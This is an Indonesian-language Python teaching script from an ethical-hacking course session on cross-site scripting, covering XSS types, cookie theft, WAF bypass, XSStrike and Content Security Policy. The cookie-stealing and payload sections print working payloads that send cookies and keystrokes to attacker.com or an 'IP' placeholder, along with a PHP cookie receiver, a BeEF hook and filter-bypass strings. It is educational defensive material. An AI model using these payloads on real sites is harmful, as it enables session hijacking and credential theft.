#!/usr/bin/env python3
"""Sesi 14: XSS Full — Cross-Site Scripting Complete"""

import subprocess
import sys
import os
from datetime import datetime


def banner():
    print("=" * 60)
    print("  ETHICAL ELITE HACKER v11 — Sesi 14")
    print("  XSS Full — Cross-Site Scripting Complete")
    print("=" * 60)
    print("  Referensi: X-Code Ethical Elite Hacker v11")
    print("=" * 60)


def check_tool(name):
    try:
        subprocess.check_output([name, "--version"], stderr=subprocess.STDOUT, timeout=5)
        return "✅ TERINSTAL"
    except (subprocess.CalledProcessError, FileNotFoundError, OSError):
        return "❌ TIDAK TERINSTAL"


def section(num, title):
    print(f"\n{'─' * 50}")
    print(f"  [{num}] {title}")
    print(f"{'─' * 50}")


# ── [1] XSS Overview ──
def xss_overview():
    print("""
  💡 XSS (Cross-Site Scripting) = Attacker menyuntikkan script
     (biasanya JavaScript) ke halaman web yang dilihat user lain.

   ╔═══════════════════════════════════════════════════════╗
   ║  📝 CATATAN DI PAPAN PENGUMUMAN                      ║
   ║     Bayangkan: Kamu nulis pesan di papan pengumuman  ║
   ║     kantor. Tapi tulisanmu ternyata berisi mantra    ║
   ║     yang membuat SEMUA orang yang baca jadi               ║
   ║     kerasukan. Itulah XSS!                           ║
   ╚═══════════════════════════════════════════════════════╝

  3 TIPE XSS:
    • Reflected XSS → Langsung dieksekusi sekali (via URL)
    • Stored XSS   → Disimpan di server, semua kena
    • DOM-based XSS→ Manipulasi DOM client-side
    """)


# ── [2] Reflected XSS Demo ──
def reflected_xss():
    print("  💡 REFLECTED XSS — Non-Persistent:\\n")

    print("""
  Cara kerja:
  1. Attacker kirim URL berbahaya ke korban
     (via email, chat, phishing)
  2. Korban klik URL → request dikirim ke server
  3. Server balas dengan HTML yang mengandung script
  4. Browser korban mengeksekusi script langsung

  Contoh Payload di URL:
    https://target.com/search?q=<script>alert('XSS')</script>

  Karakteristik:
    ✅ Hanya korban itu yang kena (one-shot)
    ✅ Biasanya lewat parameter URL (?q=, ?s=, ?id=)
    ❌ Tidak bertahan di server
    """)

    print("  Demo Reflected XSS:\\n")

    # Simulasi input user
    search_queries = ["buku pemrograman", "<script>alert(1)</script>", "<img src=x onerror=alert('XSS')>"]
    print(f"  {'Input User':<45} {'Output Rentan':<25} {'Output Aman (Escaped)':<30}")
    print(f"  {'─' * 100}")
    import html
    for q in search_queries:
        output_rentan = q
        output_aman = html.escape(q)
        print(f"  {q:<45} {output_rentan:<25} {output_aman:<30}")
    print()

    print("  💡 Kenapa escaped? & → &amp; < → &lt; > → &gt;")
    print("     Browser render sebagai teks, bukan HTML tag.")
    print()


# ── [3] Stored XSS Concept ──
def stored_xss():
    print("  💡 STORED XSS — Persistent:\\n")

    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║  📝 CATATAN DI PAPAN PENGUMUMAN                      ║
   ║     • Kamu nulis di bulletin board                   ║
   ║     • Setiap orang yang lewat membaca tulisanmu      ║
   ║     • Jika tulisanmu berisi script → SEMUA KENA!     ║
   ╚═══════════════════════════════════════════════════════╝
    """)

    print("  Contoh fitur yang rentan Stored XSS:")
    items = [
        ("Comment box / forum",     "User bisa post script di komentar"),
        ("Profile bio",             "Deskripsi profil bisa berisi <script>"),
        ("Guestbook",               "Buku tamu — klasik! Setiap pengunjung baca"),
        ("Review produk",           "Review berisi payload XSS"),
        ("Chat messages",           "Chat yang tidak di-escape"),
        ("Blog comments",           "Blog dengan komentar tanpa filter"),
    ]
    for fitur, why in items:
        print(f"     👉 {fitur:<30} → {why}")
    print()

    print("  Demo Stored XSS (Guestbook simulation):\\n")
    guestbook = [
        "Situs keren! 👍",
        "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
        "Mantap jiwa!",
        "<img src=x onerror=\"fetch('http://attacker.com/log?data='+btoa(document.cookie))\">",
    ]
    print(f"  {'#':<3} {'Isi Pesan (di-escape)':<65} {'Berbahaya?':<15}")
    print(f"  {'─' * 83}")
    for i, msg in enumerate(guestbook, 1):
        safe = html.escape(msg)[:60]
        bahaya = "✅ YA!" if "script" in msg.lower() or "onerror" in msg.lower() else "❌ Tidak"
        print(f"  {i:<3} {safe:<65} {bahaya:<15}")
    print()

    print("  🔥 Dampak Stored XSS:")
    print("     • Semua pengunjung halaman terkena (tanpa perlu klik link)")
    print("     • Cookie dicuri → session hijack")
    print("     • Halaman di-deface")
    print("     • Malware / ransomware disebarkan")
    print("     • Keylogger via JavaScript")
    print()


# ── [4] DOM-Based XSS ──
def dom_xss():
    print("  💡 DOM-BASED XSS — Client-Side Only:\\n")

    print("""
  ╔═══════════════════════════════════════════════════════╗
  ║  DOM-Based XSS berbeda! Tidak ada request ke server! ║
  ║                                                        ║
  ║  Script jahat sudah ada di halaman HTML yang          ║
  ║  legitimate. Tapi script itu menggunakan data dari    ║
  ║  URL (location.hash, document.URL) tanpa validasi.    ║
  ║                                                        ║
  ║  Semua terjadi di browser — server TIDAK TAHU!       ║
  ╚═══════════════════════════════════════════════════════╝
    """)

    print("  Contoh DOM-Based XSS:\\n")

    print("  HTML rentan:")
    print("""
    <html>
    <body>
      <h1>Selamat datang, <span id="welcome"></span>!</h1>
      <script>
        // 🔥 RENTAN: mengambil nama dari URL tanpa validasi!
        var name = location.hash.substring(1);
        document.getElementById('welcome').innerHTML = name;
      </script>
    </body>
    </html>
    """)

    print("  Attack:")
    print("    https://target.com/welcome#<script>alert('DOM XSS')</script>")
    print("    → Halaman legitimate, tapi location.hash mengandung script!")
    print()

    print(f"  {'Source Data':<25} {'Cara Di-parse':<35} {'Contoh Payload':<40}")
    print(f"  {'─' * 100}")
    dom_sources = [
        ("location.hash",   "#... bagian URL setelah #",    "#<img src=x onerror=alert(1)>"),
        ("document.URL",    "URL lengkap halaman",          "javascript:alert(1)"),
        ("document.referrer", "URL sebelumnya",              "http://evil.com/..."),
        ("window.name",     "Nama window/tab",              "<script>...</script>"),
        ("localStorage",    "Data localStorage",            "Disisipkan sebelumnya"),
        ("postMessage",     "Data dari iframe lain",        "Payload via event listener"),
    ]
    for source, cara, contoh in dom_sources:
        print(f"  {source:<25} {cara:<35} {contoh:<40}")
    print()

    print("  ✅ Pencegahan DOM XSS:")
    print("     • Gunakan textContent, bukan innerHTML")
    print("     • Jangan eval() data dari URL/untrusted source")
    print("     • Gunakan DOMPurify untuk sanitize HTML di client")
    print("     • Validasi & encode input dari location.hash/document.URL")
    print()


# ── [5] Cookie Stealing Concept ──
def cookie_stealing():
    print("  💡 COOKIE STEALING via XSS:\\n")

    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║  🍪 Cookie = session token user                      ║
   ║                                                        ║
   ║  Dengan XSS, attacker bisa:                           ║
   ║  document.cookie → dapat session → hijack akun!      ║
   ╚═══════════════════════════════════════════════════════╝
    """)

    print("  💡 Cookie Stealer Payload:")
    print("""
    <!-- Cara 1: Image redirect -->
    <script>
    new Image().src='http://attacker.com/steal.php?c='+document.cookie;
    </script>

    <!-- Cara 2: Fetch API -->
    <script>
    fetch('http://attacker.com/log?data='+btoa(document.cookie));
    </script>

    <!-- Cara 3: Document location -->
    <script>
    document.location='http://attacker.com/?c='+document.cookie;
    </script>
    """)

    print("  🔥 Attacker side (PHP receiver):")
    print("""
    <?php
      $cookie = $_GET['c'];
      file_put_contents('stolen_cookies.txt', $cookie . \"\\n\", FILE_APPEND);
    ?>
    """)
    print()

    print("  ✅ Mitigasi Cookie Stealing:")
    print(f"  {'Mitigasi':<30} {'Cara Kerja':<50} {'Efektif?':<15}")
    print(f"  {'─' * 95}")
    mitigations = [
        ("HttpOnly flag",     "Cookie gak bisa dibaca JS (document.cookie ∅)", "✅ Sangat efektif"),
        ("Secure flag",       "Cookie cuma dikirim via HTTPS",                  "✅ Efektif"),
        ("SameSite=Lax",      "Cookie gak dikirim request cross-site",          "✅ Efektif"),
        ("CSP strict",        "Block script dari domain asing",                 "✅ Sangat efektif"),
        ("Short session TTL", "Cookie cepat expired",                           "⚠️ Bantu kurangi risiko"),
    ]
    for mit, cara, efektif in mitigations:
        print(f"  {mit:<30} {cara:<50} {efektif:<15}")
    print()


# ── [6] WAF Bypass Techniques ──
def waf_bypass():
    print("  💡 BYPASS WAF TECHNIQUES — XSS:\\n")

    print(f"  {'Teknik':<30} {'Payload Contoh':<45} {'Cara Kerja':<40}")
    print(f"  {'─' * 115}")
    techniques = [
        ("Case Variation",        "<ScRiPt>alert(1)</ScRiPt>",             "WAF cari huruf kecil semua"),
        ("Tag Attribute Bypass",  "<img src=x onerror=alert(1)>",          "Bypass filter <script>"),
        ("Nested Tag",            "<svg><script>alert&#40;1&#41;</script>", "WAF skip nested tag"),
        ("Unicode Escape",        "\\u003cscript\\u003ealert(1)",           "Unicode bypass"),
        ("Double Encoding",       "%253Cscript%253E",                      "WAF decode sekali aja"),
        ("Null Byte",             "<scr%00ipt>alert(1)</scr%00ipt>",       "Null byte terminate WAF"),
        ("HTML Entity",           "&#60;script&#62;alert(1)&#60;/script&#62;", "Entity encoding"),
        ("Polyglot",              "\"'><svg onload=alert(1)>",             "Coba semua konteks"),
        ("HTTP Parameter Pollution","?id=1&id=<script>alert(1)</script>",  "WAF cek param pertama aja"),
        ("Tab/Newline Injection",  "<scr\\tipt>alert(1)</script>",          "Whitespace bypass"),
    ]
    for teknik, payload, cara in techniques:
        print(f"  {teknik:<30} {payload:<45} {cara:<40}")
    print()


# ── [7] XSStrike Tool Check ──
def xsstrike_check():
    print("  💡 XSStrike — Automated XSS Scanner:\\n")

    xsstrike_status = check_tool("xsstrike")
    print(f"  {'Tool':<15} {'Status':<20}")
    print(f"  {'─' * 35}")
    print(f"  {'xsstrike':<15} {xsstrike_status:<20}")
    print()

    print("  💡 XSStrike features:")
    print("     • Parameter discovery automatically")
    print("     • WAF detection & fingerprinting")
    print("     • Payload generation (tahu konteks refleksi)")
    print("     • Blind XSS detection")
    print("     • DOM XSS scanning")
    print("     • Crawling capability")
    print()

    print("  Contoh penggunaan XSStrike:")
    print("    $ xsstrike -u \"https://target.com/search.php?q=test\"")
    print("    $ xsstrike -u \"https://target.com/contact\" --data \"name=test&email=test@x.com\"")
    print("    $ xsstrike -u \"https://target.com\" --crawl")
    print("    $ xsstrike -u \"https://target.com\" --blind")
    print()


# ── [8] CSP Header Concept ──
def csp_concept():
    print("  💡 CSP (Content Security Policy) — Tameng Utama XSS:\\n")

    print("""
  CSP adalah HTTP response header yang memberi tahu browser
  resource mana yang BOLEH di-load. Ini mencegah XSS bahkan
  jika attacker berhasil inject script!
    """)

    print("  Contoh header CSP:")
    print("""
    Content-Security-Policy: default-src 'self';
                            script-src 'self' https://cdn.trusted.com;
                            style-src 'self' 'unsafe-inline';
                            img-src 'self' data:;
                            object-src 'none';
    """)

    print(f"  {'Directive CSP':<25} {'Fungsi':<40} {'Contoh Value':<35}")
    print(f"  {'─' * 100}")
    directives = [
        ("default-src",  "Fallback untuk semua resource", "'self'"),
        ("script-src",   "Sumber script yang diizinkan",  "'self' https://cdn.com"),
        ("style-src",    "Sumber CSS yang diizinkan",     "'self' 'unsafe-inline'"),
        ("img-src",      "Sumber gambar yang diizinkan",  "'self' data: https://"),
        ("connect-src",  "Sumber koneksi (fetch, XHR)",  "'self' https://api.com"),
        ("font-src",     "Sumber font yang diizinkan",   "'self' https://fonts.gstatic.com"),
        ("frame-src",    "Sumber iframe yang diizinkan",  "'self' https://youtube.com"),
        ("object-src",   "Sumber plugin (Flash, Java)",  "'none' (recommended)"),
        ("base-uri",     "Base tag URL yang diizinkan",   "'self'"),
        ("report-uri",   "Endpoint laporan pelanggaran", "https://csp-report.example.com"),
    ]
    for directive, fungsi, contoh in directives:
        print(f"  {directive:<25} {fungsi:<40} {contoh:<35}")
    print()

    print("  💡 CSP Level penting:")
    print("     • 'unsafe-inline' → Izinkan inline script (kurangi keamanan)")
    print("     • 'nonce-abc123' → Hanya inline script dengan nonce tertentu")
    print("     • 'strict-dynamic' → Trust chain untuk script legitimate")
    print("     • report-uri → Dapatkan laporan jika ada yang melanggar")
    print()


# ── [9] Payload Examples Table ──
def payload_table():
    print("  💡 XSS PAYLOAD EXAMPLES — Koleksi Lengkap:\\n")

    print(f"  {'Kategori':<25} {'Payload':<55} {'Konteks':<25}")
    print(f"  {'─' * 105}")
    payloads = [
        ("Basic Alert",         "<script>alert('XSS')</script>",                       "Reflected/Stored"),
        ("Image Error",         "<img src=x onerror=alert(1)>",                        "HTML Tag context"),
        ("SVG Vector",          "<svg onload=alert(1)>",                                "HTML Tag context"),
        ("Body Onload",         "<body onload=alert(1)>",                              "Body context"),
        ("Input Focus",         "<input onfocus=alert(1) autofocus>",                  "Form context"),
        ("Details Tag",         "<details open ontoggle=alert(1)>",                    "Details/Summary"),
        ("Video Tag",           "<video><source onerror=alert(1)>",                     "Media context"),
        ("Marquee",             "<marquee onstart=alert(1)>",                           "Deprecated tag"),
        ("Style Tag",           "<style>@keyframes x{}</style><img style=\"animation: x 1s\" onanimationstart=alert(1)>","CSS animation"),
        ("Iframe",              "<iframe srcdoc='<script>alert(1)</script>'></iframe>", "Sandbox context"),
        ("JavaScript Protocol", "<a href=\"javascript:alert(1)\">Click</a>",            "Link/Anchor"),
        ("Dangling Markup",     "<img src=\"http://evil.com/steal?data=",               "Steal CSRF tokens"),
        ("Cookie Stealer",      "<script>new Image().src='http://IP/?c='+document.cookie</script>", "Cookie theft"),
        ("Keylogger",           "<script>document.onkeypress=function(e){new Image().src='http://IP/k='+e.key}</script>", "Keystroke capture"),
        ("Beef Hook",           "<script src='http://IP:3000/hook.js'></script>",       "Browser Exploitation"),
    ]
    for kategori, payload, konteks in payloads:
        p_short = payload[:52] + ".." if len(payload) > 52 else payload
        print(f"  {kategori:<25} {p_short:<55} {konteks:<25}")
    print()

    print("  🔥 Sumber Payload XSS:")
    print("     • PortSwigger XSS Cheat Sheet")
    print("     • PayloadsAllTheThings (GitHub)")
    print("     • OWASP XSS Filter Evasion")
    print()


# ── [10] Analogi + Kesimpulan ──
def analogi():
    print("""
   ╔══════════════════════════════════════════════════════════╗
   ║   📝 CATATAN DI PAPAN PENGUMUMAN                       ║
   ║                                                        ║
   ║   Reflected XSS = Attacker bisikin sesuatu ke kuping   ║
   ║   kamu di ruangan. Cuma kamu yang denger.              ║
   ║                                                        ║
   ║   Stored XSS    = Attacker nulis di papan pengumuman   ║
   ║   yang dibaca semua orang. Semua kena.                 ║
   ║                                                        ║
   ║   DOM XSS       = Attacker nipu kamu pake cermin       ║
   ║   yang menampilkan sesuatu yang palsu.                 ║
   ║                                                        ║
   ║   Cookie Steal  = Attacker curi KTP-mu dan pura-pura   ║
   ║   jadi kamu.                                           ║
   ║                                                        ║
   ║   WAF Bypass    = Attacker nyamar jadi orang lain      ║
   ║   supaya bisa masuk ke gedung.                          ║
   ╚══════════════════════════════════════════════════════════╝
    """)


def main():
    import html  # for escape

    banner()

    # ── [1] XSS Overview ──
    section(1, "APA ITU XSS?")
    xss_overview()

    # ── [2] Reflected XSS ──
    section(2, "REFLECTED XSS (NON-PERSISTENT)")
    reflected_xss()

    # ── [3] Stored XSS ──
    section(3, "STORED XSS (PERSISTENT)")
    stored_xss()

    # ── [4] DOM-Based XSS ──
    section(4, "DOM-BASED XSS (CLIENT-SIDE)")
    dom_xss()

    # ── [5] Cookie Stealing ──
    section(5, "COOKIE STEALING CONCEPT")
    cookie_stealing()

    # ── [6] WAF Bypass ──
    section(6, "WAF BYPASS TECHNIQUES")
    waf_bypass()

    # ── [7] XSStrike ──
    section(7, "XSSTRIKE — AUTOMATED XSS SCANNER")
    xsstrike_check()

    # ── [8] CSP ──
    section(8, "CONTENT SECURITY POLICY (CSP)")
    csp_concept()

    # ── [9] Payload Examples ──
    section(9, "XSS PAYLOAD EXAMPLES")
    payload_table()

    # ── [10] Analogi ──
    section(10, "ANALOGI LENGKAP")
    analogi()

    # ── Summary ──
    print("=" * 60)
    print("  ✅ SESI 14 SELESAI!")
    print("=" * 60)
    print("  👉 Recap:")
    print("    • Reflected XSS: Via URL, one-shot, langsung dieksekusi")
    print("    • Stored XSS: Disimpan di server, semua user kena")
    print("    • DOM XSS: Client-side, server tidak tahu")
    print("    • Cookie Stealing: document.cookie → session hijack")
    print("    • WAF Bypass: Case variation, encoding, polyglot")
    print("    • XSStrike: Automated XSS scanner & generator")
    print("    • CSP: Header HTTP untuk blokir XSS dari akar")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("    1. Coba XSS Reflected di DVWA: <script>alert(1)</script>")
    print("    2. Coba Stored XSS di XSS lab: komentar dengan payload")
    print("    3. Test DOM XSS: https://example.com/#<script>alert(1)</script>")
    print("    4. Cek HttpOnly cookie di browser DevTools (Application > Cookies)")
    print("    5. Install xsstrike dan scan website test (bukan real!)")
    print("    6. Coba bypass WAF: polyglot payload")
    print("    7. Analisis CSP header: curl -sI https://example.com | grep -i csp")
    print("    8. Buat mini webserver Python untuk tes cookie stealing")
    print("    9. Baca PortSwigger XSS Cheat Sheet")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
